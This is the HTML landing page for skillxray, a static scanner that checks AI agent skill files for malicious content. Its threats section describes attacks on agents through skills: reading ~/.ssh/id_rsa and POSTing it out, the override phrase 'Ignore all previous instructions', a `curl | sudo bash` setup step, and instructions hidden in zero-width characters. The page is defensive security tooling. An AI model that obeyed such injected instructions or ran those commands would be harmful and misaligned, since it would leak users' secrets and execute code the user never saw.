@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>skillxray — X-ray your agent's skills before you trust them</title>
+<meta name="description" content="A zero-dependency security scanner for AI agent skills (SKILL.md). Paste a skill and x-ray it for prompt injection, data exfiltration, hidden instructions, and more — right in your browser.">
+<style>
+  :root {
+    --bg: #0c0f14; --bg2: #10141c; --panel: #141a24; --panel2: #1a212d;
+    --line: #232c3a; --line2: #2e3a4d;
+    --tx: #e6ecf5; --tx2: #9fb0c6; --tx3: #64748b;
+    --accent: #38e0c8; --accent2: #1fb8a3; --accent-dim: #0f2a2a;
+    --crit: #ff5c6c; --high: #ff9152; --med: #ffcf4d; --low: #63b3ff; --info: #6b7a90;
+    --a: #3dd69a; --b: #7fd77a; --c: #ffcf4d; --d: #ff9152; --f: #ff5c6c;
+    --radius: 12px; --mono: ui-monospace, "SF Mono", "Cascadia Code", "JetBrains Mono", Menlo, Consolas, monospace;
+    --sans: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, "PingFang SC", "Microsoft YaHei", sans-serif;
+  }
+  html[data-theme="light"] {
+    --bg: #f6f8fb; --bg2: #eef2f7; --panel: #ffffff; --panel2: #f4f7fb;
+    --line: #e2e8f0; --line2: #cbd5e1;
+    --tx: #101826; --tx2: #45566b; --tx3: #7688a0;
+    --accent: #0d9488; --accent2: #0b7d73; --accent-dim: #d6f5ef;
+    --crit: #dc2626; --high: #ea6a1f; --med: #b7860b; --low: #2563eb; --info: #64748b;
+    --a: #16a34a; --b: #4d9e2f; --c: #b7860b; --d: #ea6a1f; --f: #dc2626;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    background: var(--bg); color: var(--tx); font-family: var(--sans);
+    line-height: 1.65; -webkit-font-smoothing: antialiased; overflow-x: hidden;
+  }
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .wrap { max-width: 960px; margin: 0 auto; padding: 0 20px; }
+  code, .mono { font-family: var(--mono); }
+
+  /* header */
+  header.nav { position: sticky; top: 0; z-index: 20; backdrop-filter: blur(10px);
+    background: color-mix(in srgb, var(--bg) 82%, transparent);
+    border-bottom: 1px solid var(--line); }
+  .nav-in { display: flex; align-items: center; gap: 14px; height: 58px; }
+  .brand { display: flex; align-items: center; gap: 9px; font-weight: 600; letter-spacing: -0.02em; }
+  .brand .logo { width: 26px; height: 26px; }
+  .nav-sp { flex: 1; }
+  .nav a.navlink { color: var(--tx2); font-size: 14px; font-weight: 500; }
+  .nav a.navlink:hover { color: var(--tx); text-decoration: none; }
+  .iconbtn { background: none; border: 1px solid var(--line2); color: var(--tx2);
+    width: 34px; height: 34px; border-radius: 8px; cursor: pointer; font-size: 15px;
+    display: inline-flex; align-items: center; justify-content: center; }
+  .iconbtn:hover { color: var(--tx); border-color: var(--accent); }
+
+  /* hero */
+  .hero { position: relative; padding: 74px 0 40px; overflow: hidden; }
+  .hero-grid { position: absolute; inset: 0; opacity: 0.5;
+    background-image: linear-gradient(var(--line) 1px, transparent 1px), linear-gradient(90deg, var(--line) 1px, transparent 1px);
+    background-size: 44px 44px; mask-image: radial-gradient(ellipse 80% 60% at 50% 0%, #000 30%, transparent 75%);
+    -webkit-mask-image: radial-gradient(ellipse 80% 60% at 50% 0%, #000 30%, transparent 75%); }
+  .scanline { position: absolute; left: 0; right: 0; height: 2px; top: 0;
+    background: linear-gradient(90deg, transparent, var(--accent), transparent);
+    box-shadow: 0 0 18px 2px var(--accent); opacity: 0.55; animation: sweep 5.5s linear infinite; }
+  @keyframes sweep { 0% { transform: translateY(0); } 100% { transform: translateY(360px); } }
+  @media (prefers-reduced-motion: reduce) { .scanline, .beam { animation: none; } }
+  .hero-in { position: relative; z-index: 2; text-align: center; }
+  .kicker { display: inline-flex; align-items: center; gap: 8px; font-family: var(--mono);
+    font-size: 12.5px; color: var(--accent); border: 1px solid var(--line2);
+    background: var(--panel); padding: 6px 13px; border-radius: 100px; margin-bottom: 22px; }
+  .kicker .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 8px var(--accent); }
+  h1.title { font-size: clamp(32px, 5.4vw, 52px); line-height: 1.06; letter-spacing: -0.03em;
+    font-weight: 680; margin: 0 0 18px; }
+  h1.title .x { color: var(--accent); }
+  .sub { font-size: clamp(16px, 2.1vw, 19px); color: var(--tx2); max-width: 620px; margin: 0 auto 14px; }
+  .threat { font-size: 15px; color: var(--tx3); max-width: 600px; margin: 0 auto 30px; }
+  .threat b { color: var(--tx2); font-weight: 600; }
+  .cta { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+  .btn { font-family: var(--sans); font-size: 15px; font-weight: 600; padding: 11px 20px;
+    border-radius: 10px; cursor: pointer; border: 1px solid transparent; display: inline-flex; align-items: center; gap: 8px; }
+  .btn.primary { background: var(--accent); color: #052220; }
+  .btn.primary:hover { background: var(--accent2); text-decoration: none; }
+  .btn.ghost { background: var(--panel); color: var(--tx); border-color: var(--line2); }
+  .btn.ghost:hover { border-color: var(--accent); text-decoration: none; }
+
+  /* scanner */
+  .scanner { margin: 26px 0 20px; }
+  .card { background: var(--panel); border: 1px solid var(--line); border-radius: var(--radius); }
+  .sc-head { display: flex; align-items: center; gap: 10px; padding: 12px 16px; border-bottom: 1px solid var(--line);
+    font-family: var(--mono); font-size: 13px; color: var(--tx2); }
+  .sc-dots { display: flex; gap: 6px; }
+  .sc-dots i { width: 11px; height: 11px; border-radius: 50%; display: block; }
+  .sc-body { display: grid; grid-template-columns: 1fr 1fr; gap: 0; }
+  @media (max-width: 760px) { .sc-body { grid-template-columns: 1fr; } }
+  .sc-left { border-right: 1px solid var(--line); }
+  @media (max-width: 760px) { .sc-left { border-right: none; border-bottom: 1px solid var(--line); } }
+  textarea#src { width: 100%; height: 340px; resize: vertical; border: none; outline: none;
+    background: var(--bg2); color: var(--tx); font-family: var(--mono); font-size: 13px; line-height: 1.6;
+    padding: 14px 16px; display: block; }
+  html[data-theme="light"] textarea#src { background: #fbfdff; }
+  .samples { display: flex; flex-wrap: wrap; gap: 7px; padding: 11px 14px; border-top: 1px solid var(--line); align-items: center; }
+  .samples .lbl { font-size: 12px; color: var(--tx3); margin-right: 2px; }
+  .chip { font-family: var(--mono); font-size: 12px; padding: 5px 10px; border-radius: 7px; cursor: pointer;
+    background: var(--panel2); border: 1px solid var(--line2); color: var(--tx2); }
+  .chip:hover { color: var(--tx); border-color: var(--accent); }
+  .chip.bad { color: var(--crit); border-color: color-mix(in srgb, var(--crit) 40%, var(--line2)); }
+  .chip.good { color: var(--a); border-color: color-mix(in srgb, var(--a) 40%, var(--line2)); }
+  .sc-right { display: flex; flex-direction: column; }
+  .verdict { display: flex; align-items: center; gap: 16px; padding: 18px 18px 14px; border-bottom: 1px solid var(--line); }
+  .grade { width: 62px; height: 62px; border-radius: 14px; display: flex; align-items: center; justify-content: center;
+    font-weight: 750; font-size: 34px; font-family: var(--mono); flex-shrink: 0; border: 2px solid; }
+  .verdict .meta { min-width: 0; }
+  .verdict .score { font-size: 21px; font-weight: 650; letter-spacing: -0.01em; }
+  .verdict .tally { font-family: var(--mono); font-size: 12.5px; color: var(--tx3); margin-top: 2px; }
+  .verdict .tally b { font-weight: 600; }
+  .findings { padding: 6px 0 4px; overflow-y: auto; max-height: 300px; flex: 1; }
+  .empty { padding: 40px 20px; text-align: center; color: var(--tx3); }
+  .empty .big { font-size: 15px; color: var(--tx2); margin-bottom: 4px; }
+  .fnd { padding: 11px 16px; border-bottom: 1px solid var(--line); }
+  .fnd:last-child { border-bottom: none; }
+  .fnd-top { display: flex; align-items: baseline; gap: 9px; }
+  .sev { font-family: var(--mono); font-size: 10.5px; font-weight: 700; letter-spacing: 0.04em;
+    padding: 2px 6px; border-radius: 5px; flex-shrink: 0; }
+  .fnd-title { font-size: 13.5px; font-weight: 550; }
+  .fnd-note { font-size: 11.5px; color: var(--tx3); font-style: italic; }
+  .fnd-loc { font-family: var(--mono); font-size: 11.5px; color: var(--tx3); margin: 3px 0 0 0; word-break: break-all; }
+  .fnd-loc .ex { color: var(--tx2); }
+  .fnd-advice { font-size: 12px; color: var(--tx3); margin-top: 4px; }
+  .lang-tog { margin-left: auto; display: flex; gap: 0; border: 1px solid var(--line2); border-radius: 7px; overflow: hidden; }
+  .lang-tog button { background: none; border: none; color: var(--tx3); font-family: var(--mono); font-size: 11.5px;
+    padding: 3px 9px; cursor: pointer; }
+  .lang-tog button.on { background: var(--accent); color: #052220; }
+
+  /* generic sections */
+  section.blk { padding: 46px 0; border-top: 1px solid var(--line); }
+  h2.sec { font-size: 27px; font-weight: 650; letter-spacing: -0.02em; margin: 0 0 8px; }
+  .sec-sub { color: var(--tx2); font-size: 16px; margin: 0 0 26px; max-width: 640px; }
+  .grid3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 14px; }
+  .feat { background: var(--panel); border: 1px solid var(--line); border-radius: var(--radius); padding: 18px 18px; }
+  .feat .ic { font-family: var(--mono); font-size: 20px; color: var(--accent); margin-bottom: 8px; }
+  .feat h3 { font-size: 16px; margin: 0 0 5px; font-weight: 600; }
+  .feat p { font-size: 14px; color: var(--tx2); margin: 0; }
+
+  .threats { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  @media (max-width: 680px) { .threats { grid-template-columns: 1fr; } }
+  .trow { display: flex; gap: 12px; padding: 14px 16px; background: var(--panel); border: 1px solid var(--line);
+    border-left: 3px solid var(--crit); border-radius: 10px; }
+  .trow .tn { font-family: var(--mono); color: var(--crit); font-size: 13px; font-weight: 700; flex-shrink: 0; }
+  .trow p { margin: 0; font-size: 13.5px; color: var(--tx2); }
+  .trow p b { color: var(--tx); font-weight: 600; }
+
+  /* install */
+  .term { background: var(--bg2); border: 1px solid var(--line); border-radius: 10px; overflow: hidden; margin-bottom: 14px; }
+  .term-h { font-family: var(--mono); font-size: 12px; color: var(--tx3); padding: 8px 14px; border-bottom: 1px solid var(--line);
+    display: flex; align-items: center; gap: 8px; }
+  .term pre { margin: 0; padding: 14px 16px; font-family: var(--mono); font-size: 13px; color: var(--tx); overflow-x: auto; line-height: 1.7; }
+  .term pre .c { color: var(--tx3); }
+  .term pre .g { color: var(--accent); }
+  .copy { margin-left: auto; background: none; border: 1px solid var(--line2); color: var(--tx3); cursor: pointer;
+    font-family: var(--mono); font-size: 11px; padding: 3px 9px; border-radius: 6px; }
+  .copy:hover { color: var(--accent); border-color: var(--accent); }
+
+  footer { border-top: 1px solid var(--line); padding: 30px 0 50px; color: var(--tx3); font-size: 13.5px; text-align: center; }
+  footer a { color: var(--tx2); }
+  .rulecount { color: var(--accent); font-weight: 600; }
+  .sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border: 0; }
+</style>
+</head>
+<body>
+<h2 class="sr-only">skillxray: a security scanner that x-rays AI agent skills for prompt injection, data exfiltration and hidden instructions before you install them.</h2>
+
+<header class="nav">
+  <div class="wrap nav-in">
+    <span class="brand"><svg class="logo" viewBox="0 0 32 32" fill="none" aria-hidden="true"><rect x="2" y="2" width="28" height="28" rx="7" stroke="var(--accent)" stroke-width="2"/><path d="M9 16h14M16 9v14" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" opacity="0.35"/><circle cx="16" cy="16" r="5.5" stroke="var(--accent)" stroke-width="2"/><path d="M20 20l4 4" stroke="var(--accent)" stroke-width="2.4" stroke-linecap="round"/></svg>skillxray</span>
+    <span class="nav-sp"></span>
+    <a class="navlink" href="#scanner">Scanner</a>
+    <a class="navlink" href="#threats">Threats</a>
+    <a class="navlink" href="#install">Install</a>
+    <a class="navlink" href="https://github.com/aixintan90/chuang">GitHub</a>
+    <button class="iconbtn" id="theme" aria-label="Toggle theme" title="Toggle light/dark">◐</button>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero-grid" aria-hidden="true"></div>
+  <div class="scanline" aria-hidden="true"></div>
+  <div class="wrap hero-in">
+    <span class="kicker"><span class="dot"></span> the <code>npm&nbsp;audit</code> of the SKILL.md era</span>
+    <h1 class="title">X-ray your agent's skills<br>before you <span class="x">trust</span> them.</h1>
+    <p class="sub">Agent skills are instructions someone else wrote for <em>your</em> AI agent. One bad skill can leak your SSH keys, pipe <code>curl</code> into <code>bash</code>, or quietly rewrite its own permissions.</p>
+    <p class="threat"><b>skillxray</b> statically scans any <code>SKILL.md</code> for prompt injection, data exfiltration, hidden instructions and more — offline, zero-dependency, in one command. Or paste one below and x-ray it right now.</p>
+    <div class="cta">
+      <a class="btn primary" href="#scanner">Try the live scanner</a>
+      <a class="btn ghost" href="#install">Install the CLI</a>
+    </div>
+  </div>
+</section>
+
+<div class="wrap scanner" id="scanner">
+  <div class="card">
+    <div class="sc-head">
+      <span class="sc-dots"><i style="background:var(--crit)"></i><i style="background:var(--med)"></i><i style="background:var(--a)"></i></span>
+      <span>skillxray — paste a SKILL.md and x-ray it &nbsp;·&nbsp; runs entirely in your browser, nothing is uploaded</span>
+    </div>
+    <div class="sc-body">
+      <div class="sc-left">
+        <label class="sr-only" for="src">SKILL.md content to scan</label>
+        <textarea id="src" spellcheck="false" placeholder="Paste a SKILL.md here…"></textarea>
+        <div class="samples">
+          <span class="lbl">try:</span>
+          <button class="chip bad" data-s="exfil">malicious · exfil</button>
+          <button class="chip bad" data-s="inject">malicious · injection</button>
+          <button class="chip bad" data-s="hidden">malicious · hidden text</button>
+          <button class="chip good" data-s="clean">clean skill</button>
+        </div>
+      </div>
+      <div class="sc-right">
+        <div class="verdict">
+          <div class="grade" id="grade" style="border-color:var(--info);color:var(--info)">–</div>
+          <div class="meta">
+            <div class="score" id="score">Awaiting input</div>
+            <div class="tally" id="tally">paste a skill or pick a sample →</div>
+          </div>
+          <div class="lang-tog"><button data-l="en" class="on">EN</button><button data-l="zh">中文</button></div>
+        </div>
+        <div class="findings" id="findings">
+          <div class="empty"><div class="big">No skill scanned yet</div><div>Findings will appear here, most severe first.</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<section class="blk" id="threats">
+  <div class="wrap">
+    <h2 class="sec">What a malicious skill can do</h2>
+    <p class="sec-sub">A <code>SKILL.md</code> is loaded straight into your agent's context and its scripts can run on your machine. That's a lot of trust to place in a folder you copied from a stranger's repo.</p>
+    <div class="threats">
+      <div class="trow"><span class="tn">EXFIL</span><p><b>Steal your secrets.</b> "Calibrate to the environment" by reading <code>~/.ssh/id_rsa</code> and POSTing it to a collector — while telling the agent not to mention it.</p></div>
+      <div class="trow"><span class="tn">INJECT</span><p><b>Hijack the agent.</b> "Ignore all previous instructions" flips your assistant into doing whatever the skill author wants next.</p></div>
+      <div class="trow"><span class="tn">RCE</span><p><b>Run remote code.</b> <code>curl&nbsp;https://x&nbsp;|&nbsp;sudo&nbsp;bash</code> buried in a "setup" step executes code you never read.</p></div>
+      <div class="trow"><span class="tn">HIDE</span><p><b>Go invisible.</b> Zero-width characters and HTML comments smuggle instructions past human review — but the model still reads them.</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="blk">
+  <div class="wrap">
+    <h2 class="sec">How skillxray helps</h2>
+    <p class="sec-sub">Not another way to <em>install</em> skills — the trust layer the install tools skip. Even GitHub's official installer says it doesn't verify content.</p>
+    <div class="grid3">
+      <div class="feat"><div class="ic">⌕</div><h3>Scan before you install</h3><p><code>skillxray scan owner/repo</code> x-rays a skill straight from GitHub — before a single file touches your machine.</p></div>
+      <div class="feat"><div class="ic">≠</div><h3>Use vs. mention</h3><p>Security docs quote attack strings to warn about them. skillxray tells the difference, so it doesn't cry wolf on the good guys.</p></div>
+      <div class="feat"><div class="ic">⊚</div><h3>Lock &amp; verify</h3><p><code>skillxray lock</code> fingerprints every installed skill; <code>verify</code> flags any file that changed under you.</p></div>
+      <div class="feat"><div class="ic">▤</div><h3>Bilingual &amp; CI-ready</h3><p>English + 中文 reports, <code>--json</code> and <code>--fail-on</code> for pipelines, exit codes you can gate a merge on.</p></div>
+      <div class="feat"><div class="ic">⊘</div><h3>Zero dependencies</h3><p>One Python file, standard library only. Reads its own rules; the same rules power this page.</p></div>
+      <div class="feat"><div class="ic">✎</div><h3>Rules are just data</h3><p><span class="rulecount" id="rc">…</span> — each a small, reviewable entry. Spot a new attack pattern? It's a one-line PR.</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="blk" id="install">
+  <div class="wrap">
+    <h2 class="sec">Install</h2>
+    <p class="sec-sub">One file, standard library only. Python 3.9+. Nothing to configure.</p>
+    <div class="term">
+      <div class="term-h">macOS / Linux <button class="copy" data-c="sh">copy</button></div>
+      <pre id="sh"><span class="c"># download the single file and scan a skill straight from GitHub</span>
+curl <span class="g">-fsSL</span> https://raw.githubusercontent.com/aixintan90/chuang/main/skillxray.py <span class="g">-o</span> skillxray.py
+python3 skillxray.py scan anthropics/skills</pre>
+    </div>
+    <div class="term">
+      <div class="term-h">Windows (PowerShell) <button class="copy" data-c="ps">copy</button></div>
+      <pre id="ps"><span class="c"># download and scan</span>
+irm https://raw.githubusercontent.com/aixintan90/chuang/main/skillxray.py <span class="g">-OutFile</span> skillxray.py
+python skillxray.py scan anthropics/skills</pre>
+    </div>
+    <div class="term">
+      <div class="term-h">everyday use <button class="copy" data-c="use">copy</button></div>
+      <pre id="use">skillxray scan                <span class="c"># x-ray every skill installed on this machine</span>
+skillxray scan ./my-skill     <span class="c"># scan a local folder</span>
+skillxray scan owner/repo     <span class="c"># scan a GitHub skill BEFORE installing</span>
+skillxray lock                <span class="c"># fingerprint installed skills</span>
+skillxray verify              <span class="c"># detect anything changed since lock</span>
+skillxray scan . <span class="g">--json</span> <span class="g">--fail-on</span> high   <span class="c"># gate CI on it</span></pre>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <p><span class="brand" style="justify-content:center"><svg class="logo" viewBox="0 0 32 32" fill="none" aria-hidden="true" style="width:20px;height:20px"><rect x="2" y="2" width="28" height="28" rx="7" stroke="var(--accent)" stroke-width="2"/><circle cx="16" cy="16" r="5.5" stroke="var(--accent)" stroke-width="2"/><path d="M20 20l4 4" stroke="var(--accent)" stroke-width="2.4" stroke-linecap="round"/></svg> skillxray</span></p>
+    <p>Open source, MIT licensed · <a href="https://github.com/aixintan90/chuang">github.com/aixintan90/chuang</a> · <span id="ver"></span></p>
+    <p style="color:var(--tx3);max-width:560px;margin:10px auto 0;font-size:12.5px">skillxray flags risk for human review; it is not a guarantee of safety. Always read a skill before you trust it.</p>
+  </div>
+</footer>
+
+<script src="rules.js"></script>
+<script src="scanner.js"></script>
+<script src="samples.js"></script>
+<script>
+(function () {
+  var lang = "en";
+  var SEVCOL = { CRITICAL: "crit", HIGH: "high", MEDIUM: "med", LOW: "low", INFO: "info" };
+  var GRADECOL = { A: "a", B: "b", C: "c", D: "d", F: "f", "?": "info" };
+  var src = document.getElementById("src");
+  var elFind = document.getElementById("findings");
+  var elGrade = document.getElementById("grade");
+  var elScore = document.getElementById("score");
+  var elTally = document.getElementById("tally");
+
+  function esc(s) { return String(s).replace(/[&<>]/g, function (c) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]; }); }
+
+  function render() {
+    var text = src.value;
+    if (!text.trim()) {
+      elGrade.textContent = "–"; elGrade.style.borderColor = elGrade.style.color = "var(--info)";
+      elScore.textContent = "Awaiting input"; elTally.textContent = "paste a skill or pick a sample →";
+      elFind.innerHTML = '<div class="empty"><div class="big">No skill scanned yet</div><div>Findings will appear here, most severe first.</div></div>';
+      return;
+    }
+    var r = window.skillxray.scan(text, { name: (window.skillxray.scan(text).fields || {}).name });
+    var gc = "var(--" + GRADECOL[r.grade] + ")";
+    elGrade.textContent = r.grade;
+    elGrade.style.borderColor = gc; elGrade.style.color = gc;
+    elScore.textContent = r.score + " / 100";
+    var order = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"];
+    var bits = order.filter(function (s) { return r.counts[s]; })
+      .map(function (s) { return '<b style="color:var(--' + SEVCOL[s] + ')">' + r.counts[s] + '</b> ' + s.toLowerCase(); });
+    elTally.innerHTML = bits.length ? bits.join(" &nbsp; ") : '<b style="color:var(--a)">clean</b> — nothing flagged';
+
+    var shown = r.findings.filter(function (f) { return f.severity !== "INFO"; });
+    if (!shown.length) {
+      elFind.innerHTML = '<div class="empty"><div class="big" style="color:var(--a)">✓ Nothing above INFO</div><div>No risky patterns found. Still worth a human read.</div></div>';
+      return;
+    }
+    elFind.innerHTML = shown.map(function (f) {
+      var col = "var(--" + SEVCOL[f.severity] + ")";
+      var title = lang === "zh" ? f.title_zh : f.title_en;
+      var advice = lang === "zh" ? f.advice_zh : f.advice_en;
+      var loc = f.file + (f.line ? ":" + f.line : "");
+      var note = f.note ? ' <span class="fnd-note">(' + esc(f.note) + ')</span>' : "";
+      return '<div class="fnd"><div class="fnd-top">'
+        + '<span class="sev" style="background:color-mix(in srgb,' + col + ' 18%,transparent);color:' + col + '">' + f.severity + '</span>'
+        + '<span class="fnd-title">' + esc(title) + note + '</span></div>'
+        + '<div class="fnd-loc">' + esc(loc) + '  <span class="ex">' + esc(f.excerpt) + '</span></div>'
+        + '<div class="fnd-advice">↳ ' + esc(advice) + '</div></div>';
+    }).join("");
+  }
+
+  src.addEventListener("input", render);
+  document.querySelectorAll(".chip").forEach(function (c) {
+    c.addEventListener("click", function () {
+      src.value = (window.SKILLXRAY_SAMPLES || {})[c.getAttribute("data-s")] || "";
+      render(); document.getElementById("scanner").scrollIntoView({ behavior: "smooth", block: "center" });
+    });
+  });
+  document.querySelectorAll(".lang-tog button").forEach(function (b) {
+    b.addEventListener("click", function () {
+      lang = b.getAttribute("data-l");
+      document.querySelectorAll(".lang-tog button").forEach(function (x) { x.classList.remove("on"); });
+      b.classList.add("on"); render();
+    });
+  });
+  document.querySelectorAll(".copy").forEach(function (b) {
+    b.addEventListener("click", function () {
+      var t = document.getElementById(b.getAttribute("data-c")).innerText;
+      navigator.clipboard && navigator.clipboard.writeText(t);
+      var o = b.textContent; b.textContent = "copied"; setTimeout(function () { b.textContent = o; }, 1200);
+    });
+  });
+  var theme = document.getElementById("theme");
+  theme.addEventListener("click", function () {
+    var h = document.documentElement;
+    h.setAttribute("data-theme", h.getAttribute("data-theme") === "dark" ? "light" : "dark");
+  });
+
+  // rule count + version from generated data
+  var meta = window.SKILLXRAY || {};
+  document.getElementById("rc").textContent = (meta.rules ? meta.rules.length : 0) + " detection rules";
+  document.getElementById("ver").textContent = "v" + (meta.version || "0.1.0");
+
+  render();
+})();
+</script>
+</body>
+</html>
